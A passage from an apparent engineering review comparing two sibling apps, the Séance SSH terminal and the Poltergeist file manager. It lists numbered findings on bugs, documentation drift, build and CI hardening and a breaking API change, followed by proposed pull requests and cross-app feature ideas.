  - Poltergeist feeds native local paths through `built_in_text_editor.dart:89/174` (`widget.file.path` for local edits, `workspace_shell.dart:2676-2683`) and `preview_panel.dart:529`.
- **Failure scenario:** on Windows, local `C:\proj\Dockerfile`, `Makefile` or `.bashrc` get no highlighting. A dotted directory (`C:\app.v2\README`) picks up a bogus extension.
- **Fix:** take Séance's two lines, plus a test for a backslash path.
- **Effort:** S.

#### X-16: Séance `badge_image` catches only `Exception` in the encode phase
- **Severity / category:** P3, bug.
- **Status / confidence:** NEW, VERIFIED.
- **Locations:**
  - Séance `lib/services/badge_image.dart:251` (`} on Exception {`).
  - Poltergeist `:253` (`} catch (_) {`, from `cee70be`: `toImage`/`toByteData` can fail with an `Error`).
  - Poltergeist PORTS "badge_image.dart — Divergences: none — carried verbatim" is now wrong.
- **Failure scenario:** an engine `Error` while rendering an imported badge escapes the record-returning API and crashes the import instead of showing "couldn't encode".
- **Fix:** port the catch to Séance and update the PORTS entry.
- **Effort:** S.

#### X-17: Poltergeist atomic writes do not order same-path writes
- **Severity / category:** P3, stability / docs.
- **Status / confidence:** NEW, VERIFIED.
- **Locations:**
  - Poltergeist `lib/services/atomic_file.dart:12-41`: unique temporary files, no per-path queue.
  - Séance `lib/services/atomic_file.dart:5,31-53` added one.
  - Poltergeist `file_stores.dart:178` (ported from Séance `ded9228`) says "[writeStringAtomically]'s own per-path queue is not enough either". That queue does not exist here.
  - Unserialized caller: `lib/services/sync_state_store.dart:45-46`.
- **Failure scenario:** two overlapping `save(pairId, …)` calls finish out of order, and the older snapshot's rename lands last. Low probability; the other stores serialize themselves.
- **Fix:** port Séance's per-path tail queue (unique names stay), or correct the comment.
- **Effort:** S.

#### X-18: Séance APK `versionCode` is always 1
- **Severity / category:** P3, build/release.
- **Status / confidence:** NEW, VERIFIED.
- **Locations:**
  - Séance pubspecs have `version: 0.9.2` with no `+build`.
  - Flutter 3.47.2 `packages/flutter_tools/lib/src/flutter_manifest.dart:200-208` returns a null build number.
  - `gradle/src/main/kotlin/FlutterPlugin.kt:131-132` defaults `flutter.versionCode` to `"1"`.
  - Poltergeist derives an ordered code (`1.0.1+1000199`, `tool/release_version`, `scripts/verify-android-version.sh`).
- **Failure scenario:** updaters that key on `versionCode` (for example Obtainium) cannot order Séance releases. Android itself still accepts same-code reinstalls.
- **Fix:** have `scripts/release.sh`'s post-bump write `X.Y.Z+<major*1e6+minor*1e3+patch>` into the app pubspec, and add the verify step to CI.
- **Effort:** S.

#### X-19: Séance iOS home-screen name is "Seance App"
- **Severity / category:** P3, visual.
- **Status / confidence:** NEW, VERIFIED.
- **Locations:** `app/seance_app/ios/Runner/Info.plist:9-10` (`CFBundleDisplayName` "Seance App") and `:17-18` (`CFBundleName` "seance_app"). Android and macOS say "Séance" (AGENTS §3); Poltergeist's iOS plist says "Poltergeist".
- **Fix:** set `CFBundleDisplayName` to `Séance` (Info.plist is UTF-8; only bundle file names must be ASCII).
- **Effort:** S.

#### X-20: Séance `docs/POLTERGEIST.md` still says Poltergeist is read-only on the catalog
- **Severity / category:** P2, docs drift.
- **Status / confidence:** NEW, VERIFIED.
- **Location:** Séance `docs/POLTERGEIST.md:348-350` ("Poltergeist reads `serverConfig` records **read-only**") and the closing bullet ("Poltergeist writes only `bookmark:` and `hostkey:` records; it never edits `serverConfig`/`secret`/`snippet` records").
- **Evidence:** Poltergeist `docs/plan/04-*.md` ("Writable Séance server catalog (amended 2026-09-24)"; "Poltergeist writes `bookmark`, `hostkey`, `serverConfig`, and opted-in `secret` records") and `server_editor_backend.dart:73-76`.
- **Why it matters:** a Séance agent that trusts this page would dismiss X-02 and X-03, and would not make `ServerConfig` changes forward-compatible.
- **Fix:** rewrite the section. State the writable catalog, the `secret:` publication rules, and a new "field-preservation" invariant (X-03).
- **Effort:** S.

#### X-21: Other agent-misleading docs drift
- **Severity / category:** P3, docs drift.
- **Status / confidence:** NEW, VERIFIED.
- **Séance AGENTS.md test counts:** `:114` and `:317` say "746 Dart tests + 700 Flutter tests + 245". They were last changed in #105 (2026-09-14), before the sidebar rebuild, themes, settings window and agent/ProxyJump work. A literal grep already finds 999 app `test(`/`testWidgets(` declarations (loops add more). STATUS points readers at these counts.
- **Séance CHANGELOG.md:** only "## Unreleased", although v0.9.2 shipped (README says "Latest release: v0.9.2"). The server-list items merged before the 0.9.2 bump are still under Unreleased.
- **Poltergeist CHANGELOG:** "Unreleased" plus "1.0.0" only, although 1.0.1 is tagged (README, STATUS:8564).
- **Poltergeist AGENTS.md:**
  - `:29` says "poltergeist_core/ pure Dart — scaffold today". Core has 63 lib files, and `poltergeist_sync` and `poltergeist_bench` plus `tool/` are missing from the layout.
  - §2 omits `secret-scan.yml` and the pin-audit, integration, sync-integration and bench jobs, and still describes the app as possibly absent.
  - CLAUDE.md:18 still says "get committed once scaffolded".
- **Poltergeist release.yml comment:** "The app scaffold milestone sets this up" (APK signing) is stale.
- **Fix:** refresh each; generate the counts in CI, or drop them.
- **Effort:** S.

#### X-22: No local-network usage string
- **Severity / category:** P3, cross-platform / UX.
- **Status:** KNOWN for iOS (SOL-040/056 "Add iOS LAN disclosure"); NEW for macOS.
- **Confidence:** LIKELY.
- **Locations:** all four `Info.plist`s lack `NSLocalNetworkUsageDescription`.
- **Failure scenario:**
  - iOS, and macOS 15+ for GUI apps, prompt on the first LAN connection (`192.168.x.x:22`) with generic text.
  - A denial yields EHOSTUNREACH that neither app explains.
  - SPECULATIVE: with ad-hoc signatures that change every build, macOS may re-ask after each update.
- **Fix:** add a string ("… connects to SSH servers on your local network") to both apps' iOS and macOS plists, and map EHOSTUNREACH on Apple platforms to a hint about Local Network permission.
- **Effort:** S.

#### X-23: Séance Dockerfile uses floating base images
- **Severity / category:** P3, build/release.
- **Status / confidence:** KNOWN (SOL-040/056 "immutable … base-image pins"), VERIFIED.
- **Location:** `packages/seance_sync_server/Dockerfile:6` (`FROM dart:stable`) and `:24` (`FROM debian:stable-slim`). `dart pub get` runs without `--enforce-lockfile`.
- **Failure scenario:** the build and runtime Debian majors diverge on a Debian release day (glibc mismatch). Rebuilds via `update.sh` are not reproducible.
- **Fix:** pin the version and digest for both images, share the Debian codename between the stages, and use `dart pub get --enforce-lockfile`.
- **Effort:** S.

#### X-24: Smaller CI port-backs to Séance
- **Severity / category:** P3, build/release.
- **Status / confidence:** NEW, VERIFIED.
- **Review retry:** Poltergeist's `zai-code-review.yml` has one bounded retry, a 350-minute backstop and an explicit `exit 1`. Séance's has a single attempt (diff between the files).
- **Secret scan:** Séance has no `secret-scan.yml`. Its test fixtures (`seance_core/test/pure_logic_test.dart`, `app/test/command_stats_privacy_test.dart`) contain PEM headers and would need a scoped allowlist like Poltergeist's `assert-private-keys-scoped.sh`.
- **Multi-OS Dart tests:** Séance's `dart` job is Ubuntu-only, although `seance_core` now carries Windows named-pipe FFI and Unix-socket agent code (`ssh_agent.dart`). Poltergeist runs its Dart suites on ubuntu, macos and windows.
- **Credentials:** no workflow in either repo sets `persist-credentials: false`, so the write token sits in `.git/config` during `pub get`/`flutter build` (package build hooks run code).
- **Effort:** S each.

#### X-25: Re-pinning to a #131 tag is a breaking bump
- **Severity / category:** info, cross-app compat.
- **Status / confidence:** NEW, VERIFIED.
- **Breaking changes, all in Séance `packages/seance_core/lib/src/ssh/ssh_session.dart`:**
  - `KeyboardInteractiveResponder` changed from `(List<String> prompts, String name, String instruction)` to `(KeyboardInteractiveChallenge challenge)` (`:108-110`). Poltergeist uses it at `poltergeist_core.dart:41`, `connection/reconnect.dart:317`, `ssh_transport.dart:105/252` and `connection_manager.dart:211`.
  - `AgentAuthUnsupportedError` was removed.
  - `openAuthenticatedClient` gained `resolveJumpHost`, `forward` and `loadAgentIdentities` (`:688-701`). Without a resolver, `jumpHostId` configs now fail honestly (`:855-861`).
  - `seance_core` added `ffi: ^2.1.0`, which needs a re-run of Poltergeist's license gate.
- **Not affected:** wire and record kinds. `git diff 035b0d8 HEAD -- packages/seance_protocol/lib` is empty.
- **v0.9.2 additions available but unconsumed:** `SshSession.runCommand` and remote-git, and `SshConnectException.isHostKeyRefusal`. Poltergeist has its own D18 block logic, so the last one is not needed.
- **Plan:**
  1. Tag Séance.
  2. Poltergeist: adapt the responder (the challenge's `server` field can feed the dialog's trusted-endpoint line) and supply a catalog-backed `SshJumpHostResolver`.
  3. Flip the editor default to agent and delete the agent warning (`server_editor.dart:340-343`, `:667`).
  4. Delete the `sshImportLimitProxyJump` badge once the import maps ProxyJump.
  5. Re-run the pin audit.

#### X-26: Poltergeist's accessibility guard has no regression gate of its own
- **Severity / category:** P3, cross-platform.
- **Status:** KNOWN (PORTS, "`scripts/test-macos-accessibility.sh` … not ported yet"), plus the new angle from X-11.
- **Confidence:** VERIFIED.
- **Evidence:** Poltergeist relies on Séance's gate "against the same Flutter line", but Séance floats on `stable` while Poltergeist is pinned.
- **Fix:** port the 45-line script and add it to the macOS legs of `ci.yml` and `release.yml` (as Séance does after `flutter build macos`).
- **Effort:** S.

### 3. Best PR candidates

1. **Poltergeist: refresh a reopened checkout (X-01).**
   - In `CheckoutManager.checkout()`, when a live record exists: `reconcile`, then lease a transfer channel and `stat` the remote path.
   - Unchanged snapshot or dirty copy: return it, but mark `remoteChanged` when dirty and the snapshot moved.
   - Changed and clean: re-download through the existing `enqueueManagedCheckout` path, so the CAS, journal and activity-panel rails still apply.
   - Unreachable or notFound: return the local copy.
   - Expose `remoteChanged` on `CheckoutSession`, and show a one-line banner in `built_in_text_editor.dart` with Reload (confirm when dirty) and Keep mine.
   - Tests in `checkout_manager_test.dart`: clean refresh, dirty kept and flagged, offline fallback, and the dedupe flight path unchanged.
   - Record the reversal of the M10 disposition in PORTS. About 250–350 lines including tests.
2. **Poltergeist: keep jump routes intact and refuse them honestly (X-02 + X-05).**
   - One line in `server_editor.dart` `_formConfig` (`jumpHostId: widget.existing?.jumpHostId`) plus an editor test.
   - Until the re-pin, a pre-dial guard in the pane/sidebar resolve path (`workspace_shell.dart:3568`, `pane_controller.dart:1004`). A resolved config with `jumpHostId != null` fails with an ARB string explaining that this build cannot route through a jump host, instead of dialing directly. A small catalog-row badge reuses the D22 chip style.
   - About 80–120 lines. It removes a latent cross-app data-loss path and a direct-dial surprise before Séance exposes ProxyJump.
3. **Séance: harden `release.yml` (X-07, plus X-11 and parts of X-24).**
   - Copy Poltergeist's structure: resolve the checkout ref, refuse to overwrite an existing release, a tag↔pubspec check (a shell loop over the four pubspecs), draft legs with `fail_on_unmatched_files`, and a sums job (download, SHA256SUMS, bijection verify, publish).
   - SHA-pin every third-party action. Set job-level `permissions` (read for `test`/`flutter`/`native` until upload). Add `persist-credentials: false`. Make Docker `latest` stable-only. Pin `FLUTTER_VERSION: '3.47.2'` in CI and release.
   - About 200 lines YAML, no app code, easy to review.
4. **Both repos: verified Linux packaging (X-08, and X-12/X-13 for Séance).**
   - In both `package-linux.sh`: SHA-256 constants for appimagetool 1.9.1 (x86_64/aarch64), `sha256sum -c` before `chmod`, and a pinned `type2-runtime` asset with its hash passed via `--runtime-file`.
   - In Séance also: Poltergeist's GLIBCXX/GCC floor mapping, `$APPLICATION_ID.desktop`, the embedded Unlicense text, `package_linux || FAILED=1`, and a transparent GTK background.
   - About 60 lines (Poltergeist) and 150 lines (Séance), each verifiable with `dpkg-deb -I` in CI.
5. **Both apps: single-instance guard (X-09).**
   - Linux: `G_APPLICATION_DEFAULT_FLAGS`, so a relaunch activates the running instance. Poltergeist can open a workspace window (D39); Séance can present the main window.
   - Windows: a named mutex keyed on the application id, and on collision `FindWindow` + `SetForegroundWindow` then exit.
   - Dart backstop: an exclusive `RandomAccessFile.lock` on `app-support/instance.lock` that shows "already running" if it is held.
   - About 80 lines per app. It closes the lost-update and re-key-orphan path on the two desktop platforms that allow double-launch.
6. **Both apps: Android backup rules (X-10).**
   - `android:allowBackup="false"`, `android:fullBackupContent="false"` and `android:dataExtractionRules="@xml/data_extraction_rules"`.
   - The rules exclude `root`/`file`/`sharedpref` for `cloud-backup` and `device-transfer`.
   - A unit test that parses the manifest, and a README line ("Reinstall and sign in to sync to move to a new phone").
   - About 30 lines per app. Poltergeist's Android support (D35) makes it timely.

### 4. Ideas (both apps)

- **Handoff in both directions.** Because the shared account gives both apps the same `serverConfigId`, a URL scheme is enough.
  - Séance's Files tab and terminal know the shell's cwd from OSC 7. Add "Open in Poltergeist" through `poltergeist://open?server=<serverConfigId>&path=/var/www`.
  - Poltergeist panes get "Open terminal here" through `seance://connect?server=<id>&cd=/var/www`. Séance already types a per-server login script, so a one-shot `cd -- '<path>'` goes the same way.
  - First slice: register the scheme on macOS (`CFBundleURLTypes`) and Linux (`MimeType=x-scheme-handler/…` in the .desktop file) for one verb, with a clipboard `sftp://user@host/path` fallback when the sibling is not installed.
- **Drag from Poltergeist onto a Séance terminal.** Dropping a remote entry from Poltergeist (same server) onto a Séance terminal pastes the shell-quoted remote path. A local file drops in as an upload to the terminal's cwd.
  - First slice: accept `text/uri-list` `sftp://` URIs in Séance's terminal drop target and paste the quoted path when host and user match the session.
- **One theme for the family.** Theme JSON already pastes both ways, and Solarized round-trips (see the PORTS D38 tests).
  - Add "Use Séance's theme" in Poltergeist Settings → Appearance. On desktop it reads Séance's `settings.json`; Poltergeist is unsandboxed and can reach Séance's container path.
  - Later, an opt-in synced `appearance` record kind so the family theme follows you. It stays device-local by default.
- **A downstream canary in Séance CI.** Add a nightly or PR job in Séance that checks out Poltergeist main, overrides `seance_core` with a `path:` to the PR's tree, and runs `dart analyze` + `dart test packages/poltergeist_core` plus Poltergeist's sync-server integration leg. It would have flagged X-25's breaking `KeyboardInteractiveResponder` change before merge.
  - First slice: analyze only, non-blocking.
- **Guard the shared files mechanically.** Put a small manifest in both repos listing `family_hues.dart`, `sidebar_kit.dart`, `selected_tab_view.dart`, the theme palette/presets/contrast files and the settings-window runners, with their normalization rules (import lines, class prefixes). A CI step diffs them against the sibling at a recorded revision, reusing Poltergeist's `tool/seance_pin_audit` machinery. Today "byte-identical" holds only by discipline.
- **Server-side operations for Poltergeist over an exec channel.** Séance v0.9.2's `runCommand` pattern (bounded, non-PTY, timeout-safe) enables:
  - same-server copy with `cp -a --reflink=auto` instead of download and upload;
  - `sha256sum` verification after a transfer;
  - a git branch chip in the pane header for directories inside a repository, reusing Séance's `remote_git.dart` parser.
  - First slice: the git chip, read-only.
- **The Séance session tray.** When both apps run, Séance's status bar shows a small ghost with Poltergeist's active transfer count for the server of the focused tab, and Poltergeist's sidebar dot shows "a Séance shell is open here". A localhost Unix socket or named pipe announces `{serverConfigId, state}` without sharing any secrets.
- **Keep transfers alive on Android.** Séance's `KeepAliveService` (dataSync foreground service with the Android 15 `onTimeout` handling) is exactly what Poltergeist's D35 gap "transfers stop when Android freezes the backgrounded app" needs.
  - First slice: port the service and channel verbatim; anchor while the transfer queue is non-empty.
- **Protocol hygiene as a shared invariant.** Add "every model round-trips unknown keys" (X-03) to POLTERGEIST.md's never-touch list, with one golden test per model in `seance_protocol` that both repos run.
